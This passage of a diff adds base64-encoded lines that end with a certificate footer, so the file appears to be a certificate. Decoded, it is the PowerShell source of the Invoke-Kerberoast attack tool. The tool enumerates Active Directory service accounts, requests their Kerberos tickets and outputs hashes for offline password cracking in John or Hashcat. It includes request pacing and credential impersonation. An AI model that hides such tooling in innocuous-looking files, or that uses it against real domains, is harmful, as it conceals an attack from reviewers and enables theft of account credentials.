+b2FzdC1hYmxlIGFjY291bnRzIGFuZCByZXR1cm5zIGV4dHJhY3RlZCB0aWNrZXQg
+aGFzaGVzLg0KQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpLCBAbWFj
+aG9zZWMgIA0KTGljZW5zZTogQlNEIDMtQ2xhdXNlICANClJlcXVpcmVkIERlcGVu
+ZGVuY2llczogSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uLCBJbnZva2UtUmV2ZXJ0
+VG9TZWxmLCBHZXQtRG9tYWluVXNlciwgR2V0LURvbWFpblNQTlRpY2tldCAgDQou
+REVTQ1JJUFRJT04NClVzZXMgR2V0LURvbWFpblVzZXIgdG8gcXVlcnkgZm9yIHVz
+ZXIgYWNjb3VudHMgd2l0aCBub24tbnVsbCBzZXJ2aWNlIHByaW5jaXBsZQ0KbmFt
+ZXMgKFNQTnMpIGFuZCB1c2VzIEdldC1TUE5UaWNrZXQgdG8gcmVxdWVzdC9leHRy
+YWN0IHRoZSBjcmFja2FibGUgdGlja2V0IGluZm9ybWF0aW9uLg0KVGhlIHRpY2tl
+dCBmb3JtYXQgY2FuIGJlIHNwZWNpZmllZCB3aXRoIC1PdXRwdXRGb3JtYXQgPEpv
+aG4vSGFzaGNhdD4uDQouUEFSQU1FVEVSIElkZW50aXR5DQpBIFNhbUFjY291bnRO
+YW1lIChlLmcuIGhhcm1qMHkpLCBEaXN0aW5ndWlzaGVkTmFtZSAoZS5nLiBDTj1o
+YXJtajB5LENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwpLA0KU0lEIChlLmcu
+IFMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTEwOCks
+IG9yIEdVSUQgKGUuZy4gNGM0MzVkZDctZGM1OC00YjE0LTlhNWUtMWZkYjBlODBk
+MjAxKS4NCldpbGRjYXJkcyBhY2NlcHRlZC4NCi5QQVJBTUVURVIgRG9tYWluDQpT
+cGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVs
+dHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLg0KLlBBUkFNRVRFUiBMREFQRmlsdGVy
+DQpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRv
+IGZpbHRlciBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdHMuDQouUEFSQU1FVEVSIFNl
+YXJjaEJhc2UNClRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCwgZS5n
+LiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIg0KVXNlZnVs
+IGZvciBPVSBxdWVyaWVzLg0KLlBBUkFNRVRFUiBTZXJ2ZXINClNwZWNpZmllcyBh
+biBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRv
+IGJpbmQgdG8uDQouUEFSQU1FVEVSIFNlYXJjaFNjb3BlDQpTcGVjaWZpZXMgdGhl
+IHNjb3BlIHRvIHNlYXJjaCB1bmRlciwgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChk
+ZWZhdWx0IG9mIFN1YnRyZWUpLg0KLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQ0K
+U3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJj
+aGVyIG9iamVjdC4NCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0DQpTcGVjaWZp
+ZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMg
+c2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLg0KLlBBUkFNRVRFUiBU
+b21ic3RvbmUNClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNo
+b3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4NCi5Q
+QVJBTUVURVIgT3V0cHV0Rm9ybWF0DQpFaXRoZXIgJ0pvaG4nIGZvciBKb2huIHRo
+ZSBSaXBwZXIgc3R5bGUgaGFzaCBmb3JtYXR0aW5nLCBvciAnSGFzaGNhdCcgZm9y
+IEhhc2hjYXQgZm9ybWF0Lg0KRGVmYXVsdHMgdG8gJ0pvaG4nLg0KLlBBUkFNRVRF
+UiBDcmVkZW50aWFsDQpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50
+aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzDQpmb3IgY29ubmVj
+dGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4NCi5QQVJBTUVURVIgRGVsYXkNClNw
+ZWNpZmllcyB0aGUgZGVsYXkgaW4gc2Vjb25kcyBiZXR3ZWVuIHRpY2tldCByZXF1
+ZXN0cy4NCi5QQVJBTUVURVIgSml0dGVyDQpTcGVjaWZpZXMgdGhlIGppdHRlciAo
+MC0xLjApIHRvIGFwcGx5IHRvIGFueSBzcGVjaWZpZWQgLURlbGF5LCBkZWZhdWx0
+cyB0byArLy0gMC4zDQouRVhBTVBMRQ0KSW52b2tlLUtlcmJlcm9hc3QgfCBmbA0K
+S2VyYmVyb2FzdHMgYWxsIGZvdW5kIFNQTnMgZm9yIHRoZSBjdXJyZW50IGRvbWFp
+bi4NCi5FWEFNUExFDQpJbnZva2UtS2VyYmVyb2FzdCAtRG9tYWluIGRldi50ZXN0
+bGFiLmxvY2FsIC1PdXRwdXRGb3JtYXQgSGFzaENhdCB8IGZsDQpLZXJiZXJvYXN0
+cyBhbGwgZm91bmQgU1BOcyBmb3IgdGhlIHRlc3RsYWIubG9jYWwgZG9tYWluLCBv
+dXRwdXR0aW5nIHRvIEhhc2hDYXQNCmZvcm1hdCBpbnN0ZWFkIG9mIEpvaG4gKHRo
+ZSBkZWZhdWx0KS4NCi5FWEFNUExFDQokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8t
+U2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtb3JjZQ0K
+JENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24u
+UFNDcmVkZW50aWFsKCdURVNUTEJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpDQpJbnZv
+a2UtS2VyYmVyb2FzdCAtQ3JlZGVudGlhbCAkQ3JlZCAtVmVyYm9zZSAtRG9tYWlu
+IHRlc3RsYWIubG9jYWwgfCBmbA0KS2VyYmVyb2FzdHMgYWxsIGZvdW5kIFNQTnMg
+Zm9yIHRoZSB0ZXN0bGFiLmxvY2FsIGRvbWFpbiB1c2luZyBhbHRlcm5hdGUgY3Jl
+ZGVudGlhbHMuDQouT1VUUFVUUw0KUG93ZXJWaWV3LlNQTlRpY2tldA0KT3V0cHV0
+cyBhIGN1c3RvbSBvYmplY3QgY29udGFpbmluZyB0aGUgU2FtQWNjb3VudE5hbWUs
+IFNlcnZpY2VQcmluY2lwYWxOYW1lLCBhbmQgZW5jcnlwdGVkIHRpY2tldCBzZWN0
+aW9uLg0KIz4NCg0KICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJl
+c3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldDQogICAg
+W091dHB1dFR5cGUoJ1Bvd2VyVmlldy5TUE5UaWNrZXQnKV0NCiAgICBbQ21kbGV0
+QmluZGluZygpXQ0KICAgIFBhcmFtKA0KICAgICAgICBbUGFyYW1ldGVyKFBvc2l0
+aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlw
+ZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0NCiAgICAgICAgW0FsaWFzKCdE
+aXN0aW5ndWlzaGVkTmFtZScsICdTYW1BY2NvdW50TmFtZScsICdOYW1lJywgJ01l
+bWJlckRpc3Rpbmd1aXNoZWROYW1lJywgJ01lbWJlck5hbWUnKV0NCiAgICAgICAg
+W1N0cmluZ1tdXQ0KICAgICAgICAkSWRlbnRpdHksDQoNCiAgICAgICAgW1ZhbGlk
+YXRlTm90TnVsbE9yRW1wdHkoKV0NCiAgICAgICAgW1N0cmluZ10NCiAgICAgICAg
+JERvbWFpbiwNCg0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQ0K
+ICAgICAgICBbQWxpYXMoJ0ZpbHRlcicpXQ0KICAgICAgICBbU3RyaW5nXQ0KICAg
+ICAgICAkTERBUEZpbHRlciwNCg0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JF
+bXB0eSgpXQ0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0NCiAgICAgICAgW1N0
+cmluZ10NCiAgICAgICAgJFNlYXJjaEJhc2UsDQoNCiAgICAgICAgW1ZhbGlkYXRl
+Tm90TnVsbE9yRW1wdHkoKV0NCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9s
+bGVyJyldDQogICAgICAgIFtTdHJpbmddDQogICAgICAgICRTZXJ2ZXIsDQoNCiAg
+ICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUn
+KV0NCiAgICAgICAgW1N0cmluZ10NCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1
+YnRyZWUnLA0KDQogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0NCiAg
+ICAgICAgW0ludF0NCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLA0KDQog
+ICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0NCiAgICAgICAgW0ludF0N
+CiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwNCg0KICAgICAgICBbU3dpdGNoXQ0K
+ICAgICAgICAkVG9tYnN0b25lLA0KDQogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDAs
+MTAwMDApXQ0KICAgICAgICBbSW50XQ0KICAgICAgICAkRGVsYXkgPSAwLA0KDQog
+ICAgICAgIFtWYWxpZGF0ZVJhbmdlKDAuMCwgMS4wKV0NCiAgICAgICAgW0RvdWJs
+ZV0NCiAgICAgICAgJEppdHRlciA9IC4zLA0KDQogICAgICAgIFtWYWxpZGF0ZVNl
+dCgnSm9obicsICdIYXNoY2F0JyldDQogICAgICAgIFtBbGlhcygnRm9ybWF0Jyld
+DQogICAgICAgIFtTdHJpbmddDQogICAgICAgICRPdXRwdXRGb3JtYXQgPSAnSm9o
+bicsDQoNCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRp
+YWxdDQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0
+dHJpYnV0ZSgpXQ0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1
+dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkNCiAgICApDQoNCiAgICBCRUdJ
+TiB7DQogICAgICAgICRVc2VyU2VhcmNoZXJBcmd1bWVudHMgPSBAew0KICAgICAg
+ICAgICAgJ1NQTicgPSAkVHJ1ZQ0KICAgICAgICAgICAgJ1Byb3BlcnRpZXMnID0g
+J3NhbWFjY291bnRuYW1lLGRpc3Rpbmd1aXNoZWRuYW1lLHNlcnZpY2VwcmluY2lw
+YWxuYW1lJw0KICAgICAgICB9DQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRl
+cnNbJ0RvbWFpbiddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbidd
+ID0gJERvbWFpbiB9DQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xE
+QVBGaWx0ZXInXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVy
+J10gPSAkTERBUEZpbHRlciB9DQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRl
+cnNbJ1NlYXJjaEJhc2UnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydTZWFy
+Y2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9DQogICAgICAgIGlmICgkUFNCb3VuZFBh
+cmFtZXRlcnNbJ1NlcnZlciddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1Nl
+cnZlciddID0gJFNlcnZlciB9DQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRl
+cnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snU2Vh
+cmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9DQogICAgICAgIGlmICgkUFNCb3Vu
+ZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFVzZXJTZWFyY2hlckFy
+Z3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9DQog
+ICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCdd
+KSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0g
+JFNlcnZlclRpbWVMaW1pdCB9DQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRl
+cnNbJ1RvbWJzdG9uZSddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJz
+dG9uZSddID0gJFRvbWJzdG9uZSB9DQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFt
+ZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydD
+cmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9DQoNCiAgICAgICAgaWYgKCRQU0Jv
+dW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7DQogICAgICAgICAgICAkTG9n
+b25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAk
+Q3JlZGVudGlhbA0KICAgICAgICB9DQogICAgfQ0KDQogICAgUFJPQ0VTUyB7DQog
+ICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0lkZW50aXR5J10pIHsgJFVz
+ZXJTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRJZGVudGl0eSB9DQog
+ICAgICAgIEdldC1Eb21haW5Vc2VyIEBVc2VyU2VhcmNoZXJBcmd1bWVudHMgfCBX
+aGVyZS1PYmplY3QgeyRfLnNhbWFjY291bnRuYW1lIC1uZSAna3JidGd0J30gfCBH
+ZXQtRG9tYWluU1BOVGlja2V0IC1EZWxheSAkRGVsYXkgLU91dHB1dEZvcm1hdCAk
+T3V0cHV0Rm9ybWF0IC1KaXR0ZXIgJEppdHRlcg0KICAgIH0NCg0KICAgIEVORCB7
+DQogICAgICAgIGlmICgkTG9nb25Ub2tlbikgew0KICAgICAgICAgICAgSW52b2tl
+LVJldmVydFRvU2VsZiAtVG9rZW5IYW5kbGUgJExvZ29uVG9rZW4NCiAgICAgICAg
+fQ0KICAgIH0NCn0NCg==
+-----END CERTIFICATE-----
